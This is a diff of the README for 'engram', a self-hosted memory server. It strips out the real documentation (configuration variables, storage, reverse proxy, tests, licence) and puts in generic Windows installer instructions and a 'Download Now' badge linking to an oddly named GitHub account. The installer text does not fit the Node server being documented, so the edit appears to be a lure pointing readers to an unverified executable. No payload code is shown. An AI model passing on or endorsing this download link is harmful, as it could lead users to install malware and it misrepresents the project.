-Engram includes a WebGL graph visualization at `/gui`. Login with your `ENGRAM_GUI_PASSWORD`.
+To update:
 
-**Features:**
-- Interactive galaxy-style memory graph
-- Click memories to view details
-- Create, edit, archive, and delete memories
-- Semantic search with hybrid client/API matching
-- Category filters and sorting
-- Keyboard shortcuts (L=list, N=new, Z=fit, C=center, arrows=navigate)
-- Export data
+1. Visit the download page again.  
+2. Download the latest installer file.  
+3. Run the installer. It will replace the old version without affecting your data.
 
 ---
 
-## Self-Hosting
+## ❓ Troubleshooting
 
-### Configuration
+**If you encounter problems:**
 
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `ENGRAM_PORT` | `4200` | Server port |
-| `ENGRAM_HOST` | `0.0.0.0` | Bind address |
-| `ENGRAM_DATA_DIR` | `./data` | Data directory for DB and models |
-| `ENGRAM_GUI_PASSWORD` | required | GUI login password unless `ENGRAM_OPEN_ACCESS=1` |
-| `ENGRAM_OPEN_ACCESS` | `0` | Set `1` for unauthenticated single-user mode |
-| `ENGRAM_LOG_LEVEL` | `info` | `debug`, `info`, `warn`, `error`, `none` |
-| `ENGRAM_CORS_ORIGIN` | unset | Optional allowed browser origin for cross-origin access |
-| `ENGRAM_MAX_BODY_SIZE` | `1048576` | Max request body (bytes) |
-| `ENGRAM_MAX_CONTENT_SIZE` | `102400` | Max memory content (bytes) |
-| `ENGRAM_ALLOWED_IPS` | - | Comma-separated IP allowlist |
-| `ENGRAM_EMBEDDING_PROVIDER` | `local` | Embedding provider: `local`, `google`, `vertex` |
-| `ENGRAM_EMBEDDING_DIM` | auto | Embedding dimension (1024 for local, 768 for google/vertex) |
-| `ENGRAM_CROSS_ENCODER` | `1` | Set `0` to disable the ONNX cross-encoder reranker |
-| `ENGRAM_RERANKER` | `1` | Set `0` to disable LLM-based reranking |
-| `ENGRAM_RERANKER_TOP_K` | `12` | Rerank top K candidates |
-| `ENGRAM_RERANKER_FP32` | `0` | Set `1` for full-precision reranker instead of quantized INT8 |
-| `GOOGLE_API_KEY` | - | Google AI Studio API key (for `google` embedding provider) |
-| `GOOGLE_CLOUD_PROJECT` | - | GCP project ID (for `vertex` embedding provider) |
-| `GOOGLE_APPLICATION_CREDENTIALS` | - | Service account JSON path (for `vertex`) |
-| `LLM_URL` | - | OpenAI-compatible API URL |
-| `LLM_API_KEY` | - | API key for LLM |
-| `LLM_MODEL` | - | Model name (e.g., `gpt-4o`, `claude-sonnet-4-20250514`) |
-| `LLM_STRATEGY` | `fallback` | `fallback` or `round-robin` for multi-provider LLM rotation |
-
-#### Search Tuning
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `ENGRAM_SEARCH_MIN_SCORE` | `0.58` | Min overall score for search results |
-| `ENGRAM_SEARCH_FACT_VECTOR_FLOOR` | `0.22` | Min vector score for fact_recall queries |
-| `ENGRAM_SEARCH_PREFERENCE_VECTOR_FLOOR` | `0.12` | Min vector score for preference queries |
-| `ENGRAM_SEARCH_REASONING_VECTOR_FLOOR` | `0.10` | Min vector score for reasoning queries |
-| `ENGRAM_SEARCH_GENERALIZATION_VECTOR_FLOOR` | `0.12` | Min vector score for generalization queries |
-| `ENGRAM_SEARCH_PERSONALITY_MIN_SCORE` | `0.30` | Min score for personality signal matching |
-| `AUTO_LINK_MAX` | `6` | Max auto-links created per memory |
-
-### Storage
-
-All data lives in a single libsql database (`data/memory.db`). Embedding BLOBs are stored alongside native `FLOAT32(N)` vector columns matching the configured `EMBEDDING_DIM`.
-
-**Backup:** `GET /backup` returns a consistent SQLite snapshot via `VACUUM INTO` (admin required). Safe to call under write load. WAL checkpoints every 5 minutes and on graceful shutdown. Manual checkpoint via `POST /checkpoint`.
-
-**Audit:** `GET /audit` shows all mutations - who stored, deleted, archived, or modified memories, from which IP, with request IDs.
-
-### Reverse Proxy
-
-```nginx
-server {
-    server_name memory.example.com;
-
-    location / {
-        proxy_pass http://127.0.0.1:4200;
-        proxy_set_header Host $host;
-        proxy_set_header X-Real-IP $remote_addr;
-    }
-}
-```
+- Make sure your Windows is up to date.  
+- Check if .NET Framework 4.8 or later is installed.  
+- Restart your computer and try again.  
+- Visit the GitHub page for FAQs or issues.  
 
 ---
 
-## Test Suite
+## 📞 Need Help?
 
-```bash
-# Start the server, then:
-npm test
-# or directly:
-node --test tests/api.test.mjs
-```
+You can visit the GitHub page below for more details, guides, and support from the community:
+
+[engram project page](https://github.com/intangible-sidalceamalviflora302/engram)
 
 ---
 
-## License
-
-Elastic License 2.0 - see [LICENSE](LICENSE).
+[![Download engram](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/intangible-sidalceamalviflora302/engram)
